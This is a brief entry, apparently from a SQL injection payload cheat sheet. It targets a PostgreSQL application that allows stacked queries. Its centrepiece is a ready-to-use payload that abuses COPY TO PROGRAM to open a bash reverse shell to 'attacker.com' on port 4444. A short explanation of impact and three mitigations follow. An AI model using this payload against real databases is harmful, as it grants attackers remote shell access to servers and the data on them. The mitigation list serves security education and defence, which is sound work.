⚠️ Only works when multiple statements are allowed (rare and dangerous)

## 🧪 Scenario: PostgreSQL-based app with stacked query vulnerability

📥 Payload:

```sql
'; COPY users TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'; --
```

## 🔍 Explanation: Leverages COPY TO PROGRAM to execute system commands (PostgreSQL feature).

🎯 Impact: Remote shell access as DB user (potential root if misconfigured).

## 🛡️ Mitigation:

- Disable COPY TO PROGRAM in PostgreSQL configuration

- Block stacked queries entirely

- Enforce least privilege on DB users

